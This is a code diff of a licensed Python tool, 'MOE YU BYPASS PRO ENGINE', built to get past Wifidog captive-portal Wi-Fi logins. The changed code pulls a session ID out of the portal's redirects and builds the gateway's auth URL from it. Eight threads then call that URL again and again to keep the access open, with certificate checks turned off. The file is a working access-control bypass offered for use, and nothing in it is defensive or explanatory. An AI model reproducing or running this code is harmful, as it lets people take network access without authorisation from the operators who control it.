@@ -7,9 +7,10 @@ import logging
 import random
 import sys
 import datetime
+import subprocess
+import hashlib
 import os
 import uuid
-from bs4 import BeautifulSoup
 from urllib.parse import urlparse, parse_qs, urljoin
 from rich.console import Console
 from rich.panel import Panel
@@ -22,15 +23,23 @@ from rich.text import Text
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
 
-PING_THREADS = 5  # တည်ငြိမ်မှုအတွက် 5 ထားပေးလိုက်ပါတယ်
-stop_event = threading.Event()
-URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+PING_THREADS = 8
+MIN_INTERVAL = 0.05
+MAX_INTERVAL = 0.2
 
 # COLOR SYSTEM
+RED = "\033[91m"
 GREEN = "\033[92m"
+CYAN = "\033[96m"
+YELLOW = "\033[93m"
+MAGENTA = "\033[95m"
 RESET = "\033[0m"
 
-# LOGO & BANNER
+logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
+stop_event = threading.Event()
+
+URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
+
 BABY_LOGO = """
 [bold cyan]
       _      
@@ -74,7 +83,7 @@ def check_expiry(expiry_str):
 def display_hacker_flag():
     console.print(Align.center(BABY_LOGO))
     console.print(Align.center(BANNER))
-    console.print(Align.center("[bold cyan]MOE YU SMART BYPASS PRO v6.0[/bold cyan]\n"))
+    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]\n"))
 
 def simpler_hacker_typing(text, style="bold green"):
     console.print("[bold #00FF00]>>> [/bold #00FF00]", end="")
@@ -121,50 +130,52 @@ def check_license_hacker_style():
         sys.exit()
 
 # ===============================
-# SMART BYPASS ENGINE
+# BYPASS ENGINE WITH LIVE STATUS
 # ===============================
 def start_bypass_process():
     while not stop_event.is_set():
         try:
             session = requests.Session()
-            # 1. စမ်းကြည့်မယ်
             r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
             if r.status_code == 204:
-                time.sleep(10)
+                time.sleep(5)
                 continue
             
             portal_url = r.url
-            r_page = session.get(portal_url, timeout=10, verify=False)
-            soup = BeautifulSoup(r_page.text, 'html.parser')
-            form = soup.find('form')
-
-            # --- CASE 1: Old Router (Form/POST ရှိရင်) ---
-            if form:
-                action = form.get('action')
-                full_action_url = requests.compat.urljoin(portal_url, action)
-                payload = {}
-                for input_tag in form.find_all('input'):
-                    name = input_tag.get('name')
-                    if name: payload[name] = "1" 
-                
-                session.post(full_action_url, data=payload, verify=False)
-                console.print(f"[yellow][!] Found Form. Trying POST bypass...[/yellow]")
-
-            # --- CASE 2: New Router (Wifidog/GET) ---
-            else:
-                path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r_page.text)
-                next_url = requests.compat.urljoin(portal_url, path_match.group(1)) if path_match else portal_url
-                
-                r2 = session.get(next_url, timeout=10, verify=False)
+            r1 = session.get(portal_url, timeout=10, verify=False)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            
+            r2 = session.get(next_url, timeout=10, verify=False)
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
                 sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+            
+            if sid:
+                p = parse_qs(urlparse(portal_url).query)
+                auth_link = f"http://{p.get('gw_address',['192.168.60.1'])[0]}:{p.get('gw_port',['2060'])[0]}/wifidog/auth?token={sid}"
                 
-                if sid_match:
-                    sid = sid_match.group(1)
-                    auth_link = f"http://192.168.60.1:2060/wifidog/auth?token={sid}"
-                    session.get(auth_link, timeout=5)
-                    console.print(f"[green][✓] Wifidog bypass active.[/green]")
+                # စာတန်းတွေ ပြန်ပြပေးမည့် function
+                def pulse_ping():
+                    while not stop_event.is_set():
+                        try:
+                            session.get(auth_link, timeout=5)
+                            # ပုံထဲကလို စာတန်းလေး ပြန်ထည့်ထားသည်
+                            sys.stdout.write(f"{GREEN}[✓] SID {sid[:20]}... | Turbo Pulse Active{RESET}\n")
+                            sys.stdout.flush()
+                        except: pass
+                        time.sleep(0.1)
 
-            time.sleep(10)
+                for _ in range(PING_THREADS):
+                    threading.Thread(target=pulse_ping, daemon=True).start()
+                
+                while True:
+                    try:
+                        if session.get("http://www.google.com", timeout=3).status_code == 200:
+                            time.sleep(10)
+                        else: break
+                    except: break
         except:
             time.sleep(5)
 
